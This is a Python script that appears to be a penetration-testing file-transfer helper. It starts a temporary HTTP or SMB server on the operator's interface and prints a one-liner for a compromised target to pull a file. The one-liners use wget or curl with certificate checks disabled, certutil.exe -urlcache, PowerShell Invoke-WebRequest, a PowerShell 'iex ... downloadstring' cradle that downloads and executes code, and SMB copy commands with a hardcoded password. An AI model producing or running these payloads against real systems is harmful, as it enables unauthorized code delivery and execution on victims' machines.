import os
import sys
import pathlib
import netifaces as ni
from subprocess import Popen

_path = str(pathlib.Path(__file__).parent.resolve())
PATH = pathlib.Path(_path)
methods = ["wget","curl","certutil.exe","Invoke-WebRequest","Invoke-Expression","smb (net use;copy)","smbclient"]
smb_user = "user" 
smb_password = "P@sSw0Rd!!!"
http_port = 80
https_port = 443

def check_file(file):
    try:
        with open(PATH/"files.txt", 'r') as f:
            for line in f:
                if file==line.split(':')[0]:
                    return line.split(':')[1].strip("\n")
        return False
    except:
        return False

def add_tmp_file(path_file,file):
    try:
        with open(PATH/"files.txt", "a+") as f:
            f.seek(0)
            data = f.read(100)
            if len(data) > 0 :
                f.write("\n")
            f.write(file+":"+path_file+":TMP")
    except:
        print("Can't open "+str(PATH/"files.txt"))
        exit()

def delete_tmp_file(file):
    try:
        with open(PATH/"files.txt", 'r+') as f:
            lines = f.readlines()
            f.seek(0)
            f.truncate()
            for line in lines:
                if ":TMP" not in line or file not in line:
                    if line.strip("\n") != "":
                        f.write(line)
    except:
        print("Can't open "+str(PATH/"files.txt"))

if __name__ == "__main__":
    text = sys.argv[1]
    if text=="-l":
        try:
            with open(PATH/"files.txt", 'r') as f:
                for line in f:
                    print(line)
        except:
            print("Can't open "+str(PATH/"files.txt"))
        finally:
            exit()
    elif text=="-i":
        try:
            for interface in ni.interfaces():
                try:
                    ip = ni.ifaddresses(interface)[ni.AF_INET][0]['addr']
                    print(interface+" ("+ip+")")
                except KeyError:
                    print("ERROR with interface "+interface)
        except:
            print("Can't show interfaces")
        finally:
            exit()
    elif len(sys.argv) == 6:
        file_path = ""
        if sys.argv[4] != "":
            if os.path.isfile(sys.argv[4]):
                file_path=sys.argv[4]
                file=os.path.split(file_path)[-1]
                add_tmp_file(file_path,file)
            else:
                print("The path file you specify is not valid")
                exit()
        else:
            file=text.split(":")[0]
            file_path=check_file(file)
        method=sys.argv[3]
        if file_path == False or method not in methods:
            print("Invalid file or method")
            exit()
        interface = sys.argv[2].split(" ")[0]
        try:
            ip = ni.ifaddresses(interface)[ni.AF_INET][0]['addr']
        except:
            print("Invalid interface")
            exit()

        if method == "wget" or method == "curl" or method == "certutil.exe" or method == "Invoke-WebRequest" or method == "Invoke-Expression":
            protocol = sys.argv[5]
            if protocol == "http":
                port=str(http_port)
            elif protocol == "https":
                if method == "certutil.exe" or method == "Invoke-WebRequest" or method == "Invoke-Expression":
                    print("HTTPS not supported for "+method)
                    exit()
                port=str(https_port)
            elif protocol == "":
                protocol = "http"
                port=str(http_port)
            else:
                print("Invalid web protocol")
                exit()
            cmd = "nohup "+sys.executable+" "+str(PATH/"onerequest_httpserver.py")+" "+str(ip)+" "+port+" "+protocol
        else:
            cmd = "nohup "+sys.executable+" "+str(PATH/"onesession_smbserver.py")+" "+file + " "+smb_user+" "+smb_password
        with open(os.devnull, 'wb') as devnull:
            Popen(cmd, stdout=devnull, stderr=devnull, shell=True)

        if method == "wget":
            if protocol =="http":
                payload = "wget "+protocol+"://"+ip+":"+port+"/transfer?file="+file+" -O "+os.path.split(file_path)[-1]
            elif protocol == "https":
                payload = "wget --no-check-certificate "+protocol+"://"+ip+":"+port+"/transfer?file="+file+" -O "+os.path.split(file_path)[-1]
        elif method == "curl":
            if protocol =="http":
                payload = "curl "+protocol+"://"+ip+":"+port+"/transfer?file="+file+" -o "+os.path.split(file_path)[-1]
            elif protocol == "https":
                payload = "curl -k "+protocol+"://"+ip+":"+port+"/transfer?file="+file+" -o "+os.path.split(file_path)[-1]
        elif method == "certutil.exe":
            if protocol =="http":
                payload = "certutil.exe -urlcache -f "+protocol+"://"+ip+":"+port+"/transfer?file="+file+" "+os.path.split(file_path)[-1]
        elif method == "Invoke-WebRequest":
            if protocol =="http":
                payload = "powershell -noprofile -c \"iwr -uri "+protocol+"://"+ip+":"+port+"/transfer?file="+file+" -OutFile "+os.path.split(file_path)[-1]+"\""
        elif method == "Invoke-Expression":
            if protocol =="http":
                payload = "powershell -noprofile -c \"iex(new-object net.webclient).downloadstring('"+protocol+"://"+ip+":"+port+"/transfer?file="+file+"')\""
        elif method == "smb (net use;copy)":
            payload = "net use \\\\"+ip+"\\share /USER:"+smb_user+" "+smb_password+" && copy \\\\"+ip+"\\share\\"+os.path.split(file_path)[-1]+" "+os.path.split(file_path)[-1]+" & net use \\\\"+ip+"\\share /del"
        elif method == "smbclient":
            payload = 'smbclient "//'+ip+'/share" -U "'+smb_user+'%'+smb_password+'" -c "get '+os.path.split(file_path)[-1]+'"'
        print(payload)
    else:
        print("Invalid parameters")
